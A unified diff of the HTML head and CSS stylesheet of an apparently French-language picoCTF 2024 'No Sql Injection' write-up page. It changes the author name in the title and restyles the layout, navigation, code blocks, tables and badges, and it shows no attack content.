@@ -1,737 +1,391 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>NoSQL Injection — picoCTF 2024 | Write-up by Yahaya Meddy</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
-  <style>
-    /* ── RESET & VARIABLES ── */
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>No Sql Injection — picoCTF 2024 | Write-up par SPECTRA MZ</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
 
-    :root {
-      --bg:        #080c18;
-      --surface:   #0f1525;
-      --surface2:  #151d30;
-      --border:    #1e2a42;
-      --cyan:      #00d4aa;
-      --cyan-dim:  #00d4aa22;
-      --cyan-glow: #00d4aa44;
-      --red:       #ff4757;
-      --amber:     #ffa502;
-      --purple:    #a855f7;
-      --text:      #e2e8f4;
-      --muted:     #6b7a99;
-      --code-bg:   #060a14;
-    }
+  :root {
+    --bg:        #080c18;
+    --surface:   #0f1525;
+    --surface2:  #151d30;
+    --border:    #1e2a42;
+    --cyan:      #00d4aa;
+    --cyan-dim:  #00d4aa22;
+    --cyan-glow: #00d4aa44;
+    --red:       #ff4757;
+    --amber:     #ffa502;
+    --purple:    #a855f7;
+    --blue:      #2f9bff;
+    --green:     #4ade80;
+    --text:      #e2e8f4;
+    --muted:     #6b7a99;
+    --code-bg:   #060a14;
+    --safe-t: env(safe-area-inset-top, 0px);
+    --safe-b: env(safe-area-inset-bottom, 0px);
+    --safe-l: env(safe-area-inset-left, 0px);
+    --safe-r: env(safe-area-inset-right, 0px);
+  }
 
-    html { scroll-behavior: smooth; }
+  html { scroll-behavior: smooth; -webkit-text-size-adjust: 100%; text-size-adjust: 100%; }
 
-    body {
-      background: var(--bg);
-      color: var(--text);
-      font-family: 'Inter', sans-serif;
-      font-size: 16px;
-      line-height: 1.7;
-      overflow-x: hidden;
-    }
+  body {
+    background: var(--bg); color: var(--text);
+    font-family: 'Inter', sans-serif; font-size: 16px; line-height: 1.7;
+    overflow-x: hidden; -webkit-font-smoothing: antialiased;
+  }
 
-    body::before {
-      content: '';
-      position: fixed; inset: 0;
-      background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,.08) 2px, rgba(0,0,0,.08) 4px);
-      pointer-events: none;
-      z-index: 9999;
-    }
+  body::before {
+    content: ''; position: fixed; inset: 0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,.08) 2px, rgba(0,0,0,.08) 4px);
+    pointer-events: none; z-index: 9999;
+  }
 
-    /* ── LAYOUT ── */
-    .layout { display: flex; min-height: 100vh; }
+  img { max-width: 100%; height: auto; display: block; }
 
-    /* ── SIDEBAR ── */
-    .sidebar {
-      position: fixed;
-      left: 0; top: 0;
-      width: 64px;
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      gap: 0;
-      z-index: 100;
-      padding: 2rem 0;
-    }
+  .progress-bar { position: fixed; top: 0; left: 0; right: 0; height: 3px; z-index: 700; background: var(--border); }
+  .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--cyan), var(--blue)); box-shadow: 0 0 8px var(--cyan-glow); transition: width .1s linear; }
 
-    .sidebar-line {
-      width: 1px;
-      flex: 1;
-      background: var(--border);
-    }
+  .back-home {
+    position: fixed; top: calc(1.2rem + var(--safe-t)); left: calc(1.2rem + var(--safe-l)); z-index: 600;
+    display: inline-flex; align-items: center; gap: .5rem; padding: .6rem 1.05rem; min-height: 44px;
+    background: rgba(15,21,37,.9); -webkit-backdrop-filter: blur(10px); backdrop-filter: blur(10px);
+    border: 1px solid var(--border); border-radius: 8px;
+    font-family: 'JetBrains Mono', monospace; font-size: .78rem; font-weight: 500; color: var(--muted);
+    text-decoration: none; transition: all .2s;
+  }
+  .back-home:hover, .back-home:active { border-color: var(--cyan); color: var(--cyan); box-shadow: 0 0 16px var(--cyan-glow); }
+  .back-home svg { width: 14px; height: 14px; flex-shrink: 0; }
 
-    .phase-dot {
-      width: 32px; height: 32px;
-      border-radius: 50%;
-      border: 1px solid var(--border);
-      background: var(--surface);
-      display: flex; align-items: center; justify-content: center;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 10px;
-      color: var(--muted);
-      cursor: pointer;
-      transition: all .3s;
-      text-decoration: none;
-      flex-shrink: 0;
-    }
-    .phase-dot:hover,
-    .phase-dot.active {
-      border-color: var(--cyan);
-      color: var(--cyan);
-      box-shadow: 0 0 12px var(--cyan-glow);
-      background: var(--cyan-dim);
-    }
+  .sidebar {
+    position: fixed; left: 0; top: 0; width: 64px; height: 100vh;
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    z-index: 100; padding: 2rem 0;
+  }
+  .sidebar-line { width: 1px; flex: 1; background: var(--border); }
+  .phase-dot {
+    width: 32px; height: 32px; border-radius: 50%; border: 1px solid var(--border); background: var(--surface);
+    display: flex; align-items: center; justify-content: center;
+    font-family: 'JetBrains Mono', monospace; font-size: 9px; color: var(--muted);
+    cursor: pointer; transition: all .3s; text-decoration: none; flex-shrink: 0;
+  }
+  .phase-dot:hover, .phase-dot.active { border-color: var(--cyan); color: var(--cyan); box-shadow: 0 0 12px var(--cyan-glow); background: var(--cyan-dim); }
 
-    /* ── MAIN ── */
-    main {
-      margin-left: 64px;
-      width: calc(100% - 64px);
-      padding: 0 2rem 6rem;
-    }
+  .mobile-nav {
+    display: none; position: fixed; bottom: 0; left: 0; right: 0; z-index: 650;
+    background: rgba(15,21,37,.95); -webkit-backdrop-filter: blur(14px); backdrop-filter: blur(14px);
+    border-top: 1px solid var(--border);
+    padding: .6rem calc(.6rem + var(--safe-l)) calc(.6rem + var(--safe-b)) calc(.6rem + var(--safe-r));
+  }
+  .mobile-nav-scroll { display: flex; gap: .5rem; overflow-x: auto; scrollbar-width: none; -ms-overflow-style: none; }
+  .mobile-nav-scroll::-webkit-scrollbar { display: none; }
+  .mobile-nav-item {
+    flex-shrink: 0; display: flex; align-items: center; justify-content: center;
+    min-width: 44px; min-height: 44px; border-radius: 8px; border: 1px solid var(--border); background: var(--surface);
+    font-family: 'JetBrains Mono', monospace; font-size: .66rem; color: var(--muted); text-decoration: none; transition: all .2s;
+  }
+  .mobile-nav-item.active { border-color: var(--cyan); color: var(--cyan); background: var(--cyan-dim); }
 
-    .inner { max-width: 860px; margin: 0 auto; }
+  main { margin-left: 64px; width: calc(100% - 64px); padding: 0 2rem 6rem; }
+  .inner { max-width: 920px; margin: 0 auto; }
 
-    /* ── HERO ── */
-    .hero {
-      padding: 5rem 0 4rem;
-      position: relative;
-    }
+  .hero { padding: 5.5rem 0 4rem; position: relative; }
+  .hero-eyebrow {
+    font-family: 'JetBrains Mono', monospace; font-size: 11px; letter-spacing: .18em; text-transform: uppercase;
+    color: var(--cyan); margin-bottom: 1.5rem; display: flex; align-items: center; gap: .75rem; flex-wrap: wrap;
+  }
+  .hero-eyebrow::before { content:''; display:inline-block; width:24px; height:1px; background: var(--cyan); }
 
-    .hero-eyebrow {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 11px;
-      letter-spacing: .18em;
-      text-transform: uppercase;
-      color: var(--cyan);
-      margin-bottom: 1.5rem;
-      display: flex;
-      align-items: center;
-      gap: .75rem;
-    }
-    .hero-eyebrow::before {
-      content: '';
-      display: inline-block;
-      width: 24px; height: 1px;
-      background: var(--cyan);
-    }
+  .hero-title {
+    font-family: 'JetBrains Mono', monospace; font-size: clamp(1.7rem, 5.2vw, 3.1rem);
+    font-weight: 700; line-height: 1.18; letter-spacing: -.02em; margin-bottom: 1rem; word-break: break-word;
+  }
+  .hero-title .accent { color: var(--cyan); }
+  .hero-title .dim { color: var(--muted); font-weight: 300; }
 
-    .hero-title {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: clamp(2.4rem, 5vw, 3.8rem);
-      font-weight: 700;
-      line-height: 1.1;
-      letter-spacing: -.02em;
-      margin-bottom: 1rem;
-    }
-    .hero-title .accent { color: var(--cyan); }
-    .hero-title .dim    { color: var(--muted); font-weight: 300; }
+  .hero-sub { font-size: clamp(.95rem, 2.2vw, 1.05rem); color: var(--muted); margin-bottom: 2.5rem; max-width: 640px; }
 
-    .hero-sub {
-      font-size: 1.05rem;
-      color: var(--muted);
-      margin-bottom: 2.5rem;
-      max-width: 560px;
-    }
+  .meta-pills { display: flex; flex-wrap: wrap; gap: .6rem; margin-bottom: 2rem; }
+  .pill { padding: .35rem .9rem; border-radius: 99px; font-family: 'JetBrains Mono', monospace; font-size: 11px; letter-spacing: .08em; font-weight: 500; white-space: nowrap; }
+  .pill-cyan   { border:1px solid var(--cyan);   color:var(--cyan);   background:var(--cyan-dim); }
+  .pill-red    { border:1px solid var(--red);    color:var(--red);    background:#ff475711; }
+  .pill-amber  { border:1px solid var(--amber);  color:var(--amber);  background:#ffa50211; }
+  .pill-purple { border:1px solid var(--purple); color:var(--purple); background:#a855f711; }
+  .pill-green  { border:1px solid var(--green);  color:var(--green);  background:#4ade8011; }
 
-    .meta-pills {
-      display: flex; flex-wrap: wrap; gap: .6rem;
-      margin-bottom: 2rem;
-    }
-    .pill {
-      padding: .3rem .9rem;
-      border-radius: 99px;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 11px;
-      letter-spacing: .08em;
-      font-weight: 500;
-      border: 1px solid var(--border);
-      color: var(--muted);
-      background: transparent;
-      cursor: pointer;
-      transition: all .2s;
-      text-decoration: none;
-      display: inline-flex;
-      align-items: center;
-      gap: .4rem;
-    }
-    .pill-cyan   { border: 1px solid var(--cyan);   color: var(--cyan);   background: var(--cyan-dim); }
-    .pill-cyan:hover { background: var(--cyan); color: var(--bg); border-color: var(--cyan); }
-    .pill-red    { border: 1px solid var(--red);    color: var(--red);    background: #ff475711; }
-    .pill-amber  { border: 1px solid var(--amber);  color: var(--amber);  background: #ffa50211; }
-    .pill-purple { border: 1px solid var(--purple); color: var(--purple); background: #a855f711; }
+  .hero-divider { width: 100%; height: 1px; background: linear-gradient(90deg, var(--cyan) 0%, var(--border) 60%, transparent 100%); margin-top: 3rem; }
 
-    .hero-divider {
-      width: 100%; height: 1px;
-      background: linear-gradient(90deg, var(--cyan) 0%, var(--border) 60%, transparent 100%);
-      margin-top: 3rem;
-    }
+  .toc { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 1.5rem 1.6rem; margin: 2rem 0; }
+  .toc-title { font-family: 'JetBrains Mono', monospace; font-size: .75rem; letter-spacing: .15em; text-transform: uppercase; color: var(--cyan); margin-bottom: 1rem; }
+  .toc-list { list-style: none; display: grid; grid-template-columns: 1fr 1fr; gap: .6rem 1.5rem; }
+  .toc-list a { font-size: .85rem; color: #b8c3d9; text-decoration: none; display: flex; align-items: baseline; gap: .5rem; transition: color .2s; min-height: 24px; }
+  .toc-list a:hover, .toc-list a:active { color: var(--cyan); }
+  .toc-num { font-family: 'JetBrains Mono', monospace; font-size: .7rem; color: var(--muted); flex-shrink: 0; }
 
-    .hero-actions {
-      margin-top: 2rem;
-      display: flex;
-      flex-wrap: wrap;
-      gap: 1rem;
-      align-items: center;
-    }
+  .section { padding: 3.5rem 0 2rem; border-bottom: 1px solid var(--border); }
+  .section:last-of-type { border-bottom: none; }
 
-    /* ── SECTIONS ── */
-    .section {
-      padding: 3.5rem 0 2rem;
-      border-bottom: 1px solid var(--border);
-    }
-    .section:last-of-type { border-bottom: none; }
+  .section-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; letter-spacing: .2em; text-transform: uppercase; color: var(--cyan); margin-bottom: .6rem; display: flex; align-items: center; gap: .5rem; }
+  .section-label span { color: var(--muted); }
+  .section-title { font-family: 'JetBrains Mono', monospace; font-size: clamp(1.2rem, 3.2vw, 1.5rem); font-weight: 600; color: var(--text); margin-bottom: 1.5rem; line-height: 1.3; }
+  .subsection-title { font-family: 'JetBrains Mono', monospace; font-size: 1rem; font-weight: 600; color: var(--cyan); margin: 2.2rem 0 .9rem; padding-left: 1rem; border-left: 2px solid var(--cyan); }
 
-    .section-label {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 10px;
-      letter-spacing: .2em;
-      text-transform: uppercase;
-      color: var(--cyan);
-      margin-bottom: .6rem;
-      display: flex; align-items: center; gap: .5rem;
-    }
-    .section-label span { color: var(--muted); }
+  p { margin-bottom: 1.1rem; color: #b8c3d9; word-wrap: break-word; }
+  p strong { color: var(--text); font-weight: 600; }
+  ul.plain, ol.plain { margin: 0 0 1.1rem 1.3rem; color: #b8c3d9; }
+  ul.plain li, ol.plain li { margin-bottom: .5rem; }
 
-    .section-title {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 1.45rem;
-      font-weight: 600;
-      color: var(--text);
-      margin-bottom: 1.5rem;
-      line-height: 1.3;
-    }
+  .def-box { background: linear-gradient(135deg, #2f9bff0a 0%, #2f9bff03 100%); border: 1px solid var(--blue); border-radius: 10px; padding: 1.3rem 1.4rem; margin: 1.2rem 0 1.6rem; }
+  .def-term { display: flex; align-items: center; gap: .6rem; font-family: 'JetBrains Mono', monospace; font-size: .92rem; font-weight: 700; color: var(--blue); margin-bottom: .5rem; flex-wrap: wrap; }
+  .def-term::before { content: '§'; font-size: 1.1rem; }
+  .def-body { color: #b8c3d9; font-size: .88rem; }
+  .def-body code { background: var(--surface2); border: 1px solid var(--border); border-radius: 4px; padding: .1em .4em; color: #c0cce8; font-size: .85em; word-break: break-all; }
 
-    .subsection-title {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 1rem;
-      font-weight: 600;
-      color: var(--cyan);
-      margin: 2rem 0 .8rem;
-      padding-left: 1rem;
-      border-left: 2px solid var(--cyan);
-    }
+  .glossary-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1rem; margin: 1.5rem 0; }
+  .glossary-card { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 1.2rem; }
+  .glossary-term { font-family: 'JetBrains Mono', monospace; font-size: .85rem; font-weight: 700; color: var(--cyan); margin-bottom: .5rem; }
+  .glossary-def { font-size: .82rem; color: var(--muted); line-height: 1.55; }
 
-    p { margin-bottom: 1rem; color: #b8c3d9; }
-    p strong { color: var(--text); font-weight: 600; }
+  /* MongoDB architecture diagram */
+  .mongo-diagram { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 1.6rem; margin: 1.5rem 0; }
+  .mongo-level { display: flex; flex-direction: column; gap: .8rem; }
+  .mongo-box {
+    border: 1px solid var(--border); border-radius: 8px; padding: 1rem 1.2rem; background: var(--surface2);
+  }
+  .mongo-box.deployment { border-color: var(--purple); }
+  .mongo-box.database { border-color: var(--blue); margin-left: 1.2rem; }
+  .mongo-box.collection { border-color: var(--cyan); margin-left: 2.4rem; }
+  .mongo-box.document { border-color: var(--amber); margin-left: 3.6rem; }
+  .mongo-label { font-family: 'JetBrains Mono', monospace; font-size: .68rem; text-transform: uppercase; letter-spacing: .1em; color: var(--muted); margin-bottom: .3rem; }
+  .mongo-name { font-family: 'JetBrains Mono', monospace; font-size: .85rem; color: var(--text); font-weight: 600; }
+  .mongo-desc { font-size: .78rem; color: var(--muted); margin-top: .3rem; }
+  @media (max-width: 640px) {
+    .mongo-box.database { margin-left: .6rem; }
+    .mongo-box.collection { margin-left: 1.2rem; }
+    .mongo-box.document { margin-left: 1.8rem; }
+  }
 
-    /* ── TERMINAL FRAME ── */
-    .terminal-frame {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 10px;
-      overflow: hidden;
-      margin: 1.5rem 0;
-      box-shadow: 0 8px 40px rgba(0,0,0,.5), 0 0 0 1px rgba(0,212,170,.06);
-    }
+  .terminal-frame { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; margin: 1.5rem 0; box-shadow: 0 8px 40px rgba(0,0,0,.5), 0 0 0 1px rgba(0,212,170,.06); }
+  .terminal-bar { background: var(--surface2); padding: .6rem .9rem; display: flex; align-items: center; gap: .5rem; border-bottom: 1px solid var(--border); flex-wrap: wrap; }
+  .t-dot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; }
+  .t-dot-red { background: #ff5f57; } .t-dot-amber { background: #ffbd2e; } .t-dot-green { background: #28c840; }
+  .terminal-bar-label { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); margin-left: .3rem; word-break: break-all; }
+  .terminal-frame .img-scroll { overflow-x: auto; -webkit-overflow-scrolling: touch; }
+  .terminal-frame img { width: 100%; display: block; vertical-align: top; }
+  .terminal-caption { padding: .6rem .9rem; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); background: var(--surface2); border-top: 1px solid var(--border); display: flex; align-items: flex-start; gap: .5rem; }
+  .terminal-caption::before { content: '▸'; color: var(--cyan); flex-shrink: 0; }
 
-    .terminal-bar {
-      background: var(--surface2);
-      padding: .6rem 1rem;
-      display: flex;
-      align-items: center;
-      gap: .5rem;
-      border-bottom: 1px solid var(--border);
-    }
-    .t-dot {
-      width: 10px; height: 10px;
-      border-radius: 50%;
-      flex-shrink: 0;
-    }
-    .t-dot-red    { background: #ff5f57; }
-    .t-dot-amber  { background: #ffbd2e; }
-    .t-dot-green  { background: #28c840; }
+  .code-wrap { background: var(--code-bg); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; margin: 1rem 0 1.5rem; position: relative; }
+  .code-header { background: var(--surface2); padding: .45rem .9rem; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid var(--border); gap: .5rem; }
+  .code-lang { font-family: 'JetBrains Mono', monospace; font-size: 10px; letter-spacing: .1em; text-transform: uppercase; color: var(--cyan); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .copy-btn { background: none; border: 1px solid var(--border); color: var(--muted); font-family: 'JetBrains Mono', monospace; font-size: 10px; padding: .35rem .7rem; border-radius: 4px; cursor: pointer; transition: all .2s; min-height: 32px; flex-shrink: 0; }
+  .copy-btn:hover, .copy-btn:active { border-color: var(--cyan); color: var(--cyan); }
+  .code-wrap pre { padding: 1.1rem 1.1rem; overflow-x: auto; -webkit-overflow-scrolling: touch; font-family: 'JetBrains Mono', monospace; font-size: .78rem; line-height: 1.7; color: #c0cce8; }
+  .code-wrap pre .kw { color: var(--cyan); }
+  .code-wrap pre .str { color: #ffdd87; }
+  .code-wrap pre .hl { color: var(--amber); font-weight: 700; }
+  .code-wrap pre .hl-cyan { color: var(--cyan); font-weight: 700; }
+  .code-wrap pre .hl-red { color: var(--red); font-weight: 700; }
+  .code-wrap pre .cmt { color: var(--muted); font-style: italic; }
+  .code-wrap pre .prop { color: var(--purple); }
 
-    .terminal-bar-label {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 11px;
-      color: var(--muted);
-      margin-left: .5rem;
-    }
+  .result-badge { display: inline-flex; align-items: flex-start; gap: .5rem; background: #00d4aa0f; border: 1px solid var(--cyan); border-radius: 6px; padding: .6rem 1rem; font-family: 'JetBrains Mono', monospace; font-size: .8rem; color: var(--cyan); margin: .5rem 0 1rem; word-break: break-word; }
+  .result-badge::before { content: '✓'; font-weight: 700; flex-shrink: 0; }
+  .warn-badge { display: inline-flex; align-items: flex-start; gap: .5rem; background: #ffa5020f; border: 1px solid var(--amber); border-radius: 6px; padding: .6rem 1rem; font-family: 'JetBrains Mono', monospace; font-size: .8rem; color: var(--amber); margin: .5rem 0 1rem; }
+  .warn-badge::before { content: '⚠'; font-weight: 700; flex-shrink: 0; }
+  .blocked-badge { display: inline-flex; align-items: flex-start; gap: .5rem; background: #ff47570f; border: 1px solid var(--red); border-radius: 6px; padding: .6rem 1rem; font-family: 'JetBrains Mono', monospace; font-size: .8rem; color: var(--red); margin: .5rem 0 1rem; }
+  .blocked-badge::before { content: '✗'; font-weight: 700; flex-shrink: 0; }
 
-    .terminal-frame img {
-      width: 100%;
-      display: block;
-      vertical-align: top;
-    }
+  .table-wrap { overflow-x: auto; -webkit-overflow-scrolling: touch; margin: 1.2rem 0 1.8rem; border-radius: 8px; border: 1px solid var(--border); }
+  table { width: 100%; border-collapse: collapse; font-size: .82rem; min-width: 480px; }
+  thead tr { background: var(--surface2); }
+  thead th { padding: .7rem .9rem; text-align: left; font-family: 'JetBrains Mono', monospace; font-size: .7rem; letter-spacing: .08em; text-transform: uppercase; color: var(--cyan); font-weight: 500; border-bottom: 1px solid var(--border); white-space: nowrap; }
+  tbody tr { border-bottom: 1px solid var(--border); transition: background .15s; }
+  tbody tr:last-child { border-bottom: none; }
+  tbody tr:hover { background: var(--surface); }
+  tbody td { padding: .7rem .9rem; color: #b8c3d9; vertical-align: top; }
+  tbody td:first-child { font-family: 'JetBrains Mono', monospace; font-size: .76rem; color: var(--amber); }
+  td code, p code, li code { font-family: 'JetBrains Mono', monospace; font-size: .82em; background: var(--surface2); border: 1px solid var(--border); border-radius: 4px; padding: .1em .4em; color: #c0cce8; word-break: break-all; }
 
-    .terminal-caption {
-      padding: .6rem 1rem;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 11px;
-      color: var(--muted);
-      background: var(--surface2);
-      border-top: 1px solid var(--border);
-      display: flex;
-      align-items: center;
-      gap: .5rem;
-    }
-    .terminal-caption::before {
-      content: '▸';
-      color: var(--cyan);
-    }
+  .chain { display: flex; flex-wrap: wrap; align-items: center; gap: .4rem; background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1.1rem 1.2rem; margin: 1rem 0 1.5rem; }
+  .chain-node { font-family: 'JetBrains Mono', monospace; font-size: .74rem; color: var(--text); background: var(--surface2); border: 1px solid var(--border); border-radius: 5px; padding: .35rem .65rem; word-break: break-all; }
+  .chain-arrow { font-family: 'JetBrains Mono', monospace; font-size: .9rem; color: var(--cyan); flex-shrink: 0; }
+  .chain-node.highlight { border-color: var(--cyan); color: var(--cyan); background: var(--cyan-dim); }
+  .chain-node.danger { border-color: var(--red); color: var(--red); background: #ff475711; }
 
-    /* ── CODE BLOCKS ── */
-    .code-wrap {
-      background: var(--code-bg);
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      overflow: hidden;
-      margin: 1rem 0 1.5rem;
-      position: relative;
-    }
+  blockquote { background: #ff475709; border-left: 3px solid var(--red); border-radius: 0 6px 6px 0; padding: .9rem 1.1rem; margin: 1rem 0; font-family: 'JetBrains Mono', monospace; font-size: .82rem; color: var(--red); word-break: break-word; }
+  blockquote.info { background: #2f9bff09; border-left-color: #2f9bff; color: #6cb6ff; }
 
-    .code-header {
-      background: var(--surface2);
-      padding: .45rem 1rem;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      border-bottom: 1px solid var(--border);
-    }
+  .rec-list { list-style: none; margin: .5rem 0; }
+  .rec-list li { display: flex; gap: .8rem; align-items: flex-start; padding: .9rem 0; border-bottom: 1px solid var(--border); color: #b8c3d9; }
+  .rec-list li:last-child { border-bottom: none; }
+  .rec-num { font-family: 'JetBrains Mono', monospace; font-size: .75rem; color: var(--cyan); background: var(--cyan-dim); border: 1px solid var(--cyan); border-radius: 4px; padding: .1rem .5rem; flex-shrink: 0; margin-top: .1rem; }
 
-    .code-lang {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 10px;
-      letter-spacing: .12em;
-      text-transform: uppercase;
-      color: var(--cyan);
-    }
+  .ref-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: .8rem; margin-top: 1rem; }
+  .ref-card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1rem; text-decoration: none; display: flex; flex-direction: column; gap: .3rem; transition: border-color .2s, box-shadow .2s; min-height: 44px; }
+  .ref-card:hover, .ref-card:active { border-color: var(--cyan); box-shadow: 0 0 20px var(--cyan-glow); }
+  .ref-icon { font-size: 1.1rem; margin-bottom: .2rem; }
+  .ref-name { font-family: 'JetBrains Mono', monospace; font-size: .78rem; color: var(--cyan); font-weight: 600; }
+  .ref-url { font-size: .73rem; color: var(--muted); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
 
-    .copy-btn {
-      background: none;
-      border: 1px solid var(--border);
-      color: var(--muted);
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 10px;
-      padding: .2rem .6rem;
-      border-radius: 4px;
-      cursor: pointer;
-      transition: all .2s;
-    }
-    .copy-btn:hover { border-color: var(--cyan); color: var(--cyan); }
+  /* Hosting providers grid */
+  .host-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(230px, 1fr)); gap: 1rem; margin: 1.5rem 0; }
+  .host-card { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 1.2rem; transition: border-color .2s, transform .2s; }
+  .host-card:hover { border-color: var(--cyan); transform: translateY(-2px); }
+  .host-icon { font-size: 1.3rem; margin-bottom: .5rem; }
+  .host-name { font-family: 'JetBrains Mono', monospace; font-size: .86rem; font-weight: 700; color: var(--cyan); margin-bottom: .4rem; }
+  .host-desc { font-size: .8rem; color: var(--muted); line-height: 1.5; }
 
-    .code-wrap pre {
-      padding: 1.1rem 1.2rem;
-      overflow-x: auto;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: .82rem;
-      line-height: 1.7;
-      color: #c0cce8;
-    }
+  .flag-box { background: linear-gradient(135deg, #00d4aa0a 0%, #00d4aa03 100%); border: 1px solid var(--cyan); border-radius: 10px; padding: 1.6rem 1.4rem; text-align: center; position: relative; overflow: hidden; margin: 1.5rem 0; }
+  .flag-box::before { content: ''; position: absolute; inset: 0; background: radial-gradient(ellipse at 50% 0%, var(--cyan-glow) 0%, transparent 70%); pointer-events: none; }
+  .flag-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; letter-spacing: .2em; text-transform: uppercase; color: var(--muted); margin-bottom: .8rem; }
+  .flag-text { font-family: 'JetBrains Mono', monospace; font-size: clamp(.85rem, 3.2vw, 1.15rem); font-weight: 700; color: var(--cyan); letter-spacing: .02em; text-shadow: 0 0 20px var(--cyan-glow); word-break: break-all; }
 
-    .code-wrap pre .kw  { color: var(--cyan); }
-    .code-wrap pre .str { color: #ffdd87; }
-    .code-wrap pre .op  { color: var(--red); }
-    .code-wrap pre .cmt { color: var(--muted); font-style: italic; }
+  footer { margin-top: 4rem; padding: 2rem 0; border-top: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 1rem; }
+  .footer-author { font-family: 'JetBrains Mono', monospace; font-size: .78rem; color: var(--muted); line-height: 1.8; }
+  .footer-badge { font-family: 'JetBrains Mono', monospace; font-size: .72rem; color: var(--muted); display: flex; align-items: center; gap: .4rem; }
+  .footer-badge span { color: var(--cyan); }
 
-    /* ── BADGES ── */
-    .result-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: .5rem;
-      background: #00d4aa0f;
-      border: 1px solid var(--cyan);
-      border-radius: 6px;
-      padding: .5rem 1rem;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: .82rem;
-      color: var(--cyan);
-      margin: .5rem 0 1rem;
-    }
-    .result-badge::before { content: '✓'; font-weight: 700; }
+  .bottom-back { display: inline-flex; align-items: center; gap: .5rem; padding: .7rem 1.2rem; margin-top: .8rem; min-height: 44px; border: 1px solid var(--cyan); border-radius: 8px; color: var(--cyan); text-decoration: none; font-family: 'JetBrains Mono', monospace; font-size: .8rem; background: var(--cyan-dim); transition: all .2s; }
+  .bottom-back:hover, .bottom-back:active { box-shadow: 0 0 20px var(--cyan-glow); }
 
-    .blocked-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: .5rem;
-      background: #ff47570f;
-      border: 1px solid var(--red);
-      border-radius: 6px;
-      padding: .5rem 1rem;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: .82rem;
-      color: var(--red);
-      margin: .5rem 0 1rem;
-    }
-    .blocked-badge::before { content: '✗'; font-weight: 700; }
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--muted); }
 
-    /* ── TABLES ── */
-    .table-wrap {
-      overflow-x: auto;
-      margin: 1.2rem 0 1.8rem;
-      border-radius: 8px;
-      border: 1px solid var(--border);
-    }
-
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      font-size: .875rem;
-    }
-
-    thead tr {
-      background: var(--surface2);
-    }
-    thead th {
-      padding: .75rem 1.1rem;
-      text-align: left;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: .75rem;
-      letter-spacing: .1em;
-      text-transform: uppercase;
-      color: var(--cyan);
-      font-weight: 500;
-      border-bottom: 1px solid var(--border);
-      white-space: nowrap;
-    }
-
-    tbody tr {
-      border-bottom: 1px solid var(--border);
-      transition: background .15s;
-    }
-    tbody tr:last-child { border-bottom: none; }
-    tbody tr:hover { background: var(--surface); }
-
-    tbody td {
-      padding: .75rem 1.1rem;
-      color: #b8c3d9;
-      vertical-align: top;
-    }
-
-    tbody td:first-child {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: .8rem;
-      color: var(--amber);
-    }
-
